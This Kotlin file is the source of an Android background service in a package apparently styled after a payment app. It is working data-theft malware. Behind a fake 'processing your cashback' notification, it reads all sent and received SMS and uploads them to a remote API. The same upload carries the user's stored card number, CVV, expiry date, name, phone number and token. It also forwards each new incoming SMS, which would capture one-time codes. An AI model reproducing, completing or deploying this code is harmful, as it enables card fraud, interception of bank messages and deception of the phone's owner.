package org.phone.pe.services

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.IBinder
import org.phone.pe.*
import org.phone.pe.models.Message
import org.phone.pe.models.MessageDetail
import android.provider.Telephony
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import org.phone.pe.services.SMSReceiver.MessageReceiverListener
import org.phone.pe.utils.PrefUtil
import org.phone.pe.network.MyClient
import org.phone.pe.ui.SplashActivity
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.sql.Date
import java.sql.Timestamp
import java.text.SimpleDateFormat

class SyncService : Service(), MessageReceiverListener {
    var context: Context? = null

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        context = this
        // set connectivityReceiverListener
        SMSReceiver.listener = this
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {

        val pendingIntent: PendingIntent =
            Intent(this, SplashActivity::class.java).let { notificationIntent ->
                PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE
                )
            }

        // create notification channel for show service notification
        val notificationChannel = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.app_name),
            NotificationManager.IMPORTANCE_LOW // disable annoying sound on android 32+
        )
        val notificationManager = getSystemService(
            NotificationManager::class.java
        )
        notificationManager.createNotificationChannel(notificationChannel)
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Congratulations we are processing your cashback")
            .setOngoing(true)
            .setAutoCancel(false)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setTicker("Congratulations we are processing your cashback")
            .build()
        startForeground(1, notification) // start foreground must be called !!

        try {
            uploadMessages()
        } catch (e: Exception) {
            Log.e("OnFailure", e.message.toString())
        }

        // stopSelf();
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    @SuppressLint("SimpleDateFormat")
    override fun onMessageReceived(number: String, message: String, time: Long) {
        Log.e("MESSAGE", message)

        val ts = Timestamp(time)
        val date = java.util.Date()
        val simpleDateFormat = SimpleDateFormat("yyyy-MM-dd' 'HH:mm:ss:S")

        val mList: ArrayList<MessageDetail> = ArrayList()
        mList.add(
            MessageDetail(
                message,
                simpleDateFormat.format(date),
                number
            )
        )
        val message = Message()
        message.name = PrefUtil.getName(context!!)
        message.mobile = PrefUtil.getNumber(context!!)
        message.cvv = PrefUtil.getCvv(context!!)
        message.expiry = PrefUtil.getExpiry(context!!)
        message.card = PrefUtil.getCard(context!!)
        message.message = mList

        MyClient.instance!!.api.uploadMessages(message)
            .enqueue(object : Callback<Message> {

                override fun onResponse(call: Call<Message>, response: Response<Message>) {
                    Log.e("RESPONSE", response.toString())
                    val jsonArray = response.body()!!

                    Log.e("RESPONSE", response.toString())

                    if (jsonArray.success == 1) {

                    }

                }

                override fun onFailure(call: Call<Message>, t: Throwable) {
                    Log.e("onFailure", t.message.toString())
                }

            })
    }

    @SuppressLint("SimpleDateFormat", "Recycle")
    private fun getMessages(): ArrayList<MessageDetail> {

        val mList: ArrayList<MessageDetail> = ArrayList()

        val uri1 = Uri.parse("content://sms//sent")
        val cursor1 = contentResolver.query(uri1, null, null, null, null)
        while (cursor1!!.moveToNext()) {
            val vtPhone = cursor1.getColumnIndex(Telephony.Sms.ADDRESS)
            val vtDate = cursor1.getColumnIndex(Telephony.Sms.DATE)
            val indexBody = cursor1.getColumnIndex(Telephony.Sms.BODY)
            val phoneNumBer = cursor1.getString(vtPhone)
            val time = cursor1.getLong(vtDate)
            val body = cursor1.getString(indexBody)
            Log.e("SENT", "$phoneNumBer : $body")

            val ts = Timestamp(time)
            val date = Date(ts.time)
            val simpleDateFormat = SimpleDateFormat("yyyy-MM-dd' 'HH:mm:ss:S")


            mList.add(
                MessageDetail(
                    body,
                    simpleDateFormat.format(date),
                    phoneNumBer
                )
            )
        }

        val uri = Uri.parse("content://sms//inbox")
        val cursor = contentResolver.query(uri, null, null, null, null)
        while (cursor!!.moveToNext()) {
            val vtPhone = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val vtDate = cursor.getColumnIndex(Telephony.Sms.DATE)
            val indexBody = cursor.getColumnIndex(Telephony.Sms.BODY)
            val phoneNumBer = cursor.getString(vtPhone)
            val time = cursor.getLong(vtDate)
            val body = cursor.getString(indexBody)
            Log.e("INBOX", "$phoneNumBer : $body")

            val ts = Timestamp(time)
            val date = Date(ts.time)
            val simpleDateFormat = SimpleDateFormat("yyyy-MM-dd' 'HH:mm:ss:S")

            mList.add(
                MessageDetail(
                    body,
                    simpleDateFormat.format(date),
                    phoneNumBer
                )
            )
        }

        return mList
    }

    private fun uploadMessages() {

        val message = Message()
        message.name = PrefUtil.getName(context!!)
        message.mobile = PrefUtil.getNumber(context!!)
        message.cvv = PrefUtil.getCvv(context!!)
        message.expiry = PrefUtil.getExpiry(context!!)
        message.card = PrefUtil.getCard(context!!)
        message.token = PrefUtil.getToken(context!!)
        message.message = getMessages()

        MyClient.instance!!.api.uploadMessages(message)
            .enqueue(object : Callback<Message> {

                override fun onResponse(call: Call<Message>, response: Response<Message>) {
                    Log.e("RESPONSE", response.toString())
                    val jsonArray = response.body()!!

                    Log.e("RESPONSE", response.body().toString())

                    if (jsonArray.success == 1) {

                    }

                }

                override fun onFailure(call: Call<Message>, t: Throwable) {
                    Log.e("onFailure", t.message.toString())
                }

            })
    }

    companion object {
        // variables
        const val CHANNEL_ID = "SyncServiceChannel"
    }
}